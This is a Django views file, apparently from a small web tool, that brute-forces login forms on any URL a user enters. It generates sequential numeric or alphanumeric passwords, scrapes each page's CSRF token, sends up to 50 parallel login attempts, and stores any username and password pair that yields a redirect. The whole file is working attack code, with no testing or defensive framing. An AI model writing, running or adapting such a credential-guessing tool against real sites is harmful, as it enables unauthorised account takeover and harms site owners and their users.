from django.shortcuts import render, redirect
from .models import *
import string
import itertools
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
import requests
from bs4 import BeautifulSoup


def generate_sequence_passwords(length=5, mode=1, limit=10, start_from='10000'):
    if mode == 1:
        characters = string.digits
    elif mode == 2:
        characters = string.ascii_letters + string.digits
    elif mode == 3:
        characters = string.ascii_letters + string.digits + string.punctuation
    else:
        raise ValueError("Mode must be 1, 2, or 3")
    
    base = len(characters)

    # Convert start_from string to its index in product sequence
    def str_to_index(s):
        index = 0
        for i, c in enumerate(s):
            index *= base
            index += characters.index(c)
        return index

    start_index = str_to_index(start_from)

    # Skip to start_index using islice
    combinations = itertools.islice(itertools.product(characters, repeat=length), start_index, start_index + limit)

    passwords = [''.join(p) for p in combinations]
    return passwords


def simple_login(login_url, data, stop_event):
    if stop_event.is_set():
        return None

    session = requests.Session()
    get_response = session.get(login_url)
    if get_response.status_code != 200:
        return None

    soup = BeautifulSoup(get_response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    if not csrf_token:
        return None

    token = csrf_token['value']
    login_data = {
        'username': data['username'],
        'password': data['password'],
        'csrfmiddlewaretoken': token
    }

    headers = {
        'Referer': login_url
    }

    post_response = session.post(login_url, data=login_data, headers=headers, allow_redirects=False)

    # Many login forms redirect (302) after success
    if post_response.status_code == 302:
        # Optional: check Location header to confirm destination
        stop_event.set()
        UserPassword.objects.create(username=data['username'], password=data['password'])
        return "Login Successful"

    return None



    

def run_parallel_posts(url, payloads, max_workers=50):
    stop_event = Event()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(simple_login, url, data, stop_event) for data in payloads]
        for future in futures:
            result = future.result()
            print(result)
            if result:
                if 'Login Successful' in result:
                    break
    return None



def home(request):
    passwords = UserPassword.objects.all()
    d = {
        3: '1000',
        4: '10000',
        5: '100000',
        6: '100000',
        7: '1000000',
        8: '10000000',
    }
    if request.method == 'POST':
        url = request.POST.get('url')
        username = request.POST.get('username')
        try_name = request.POST.get('try_name')
        mode = request.POST.get('mode')
        length = 6
        trying_passwords = generate_sequence_passwords(length=length, mode=int(mode), limit=int(try_name), start_from=d[length])

        payloads = []
        for password in trying_passwords:
            payloads.append({'username':username, 'password':password})
        
        run_parallel_posts(url, payloads, max_workers=50)
        # print(payloads)
        return redirect('home')


    return render(request, 'index.html', {'passwords':passwords})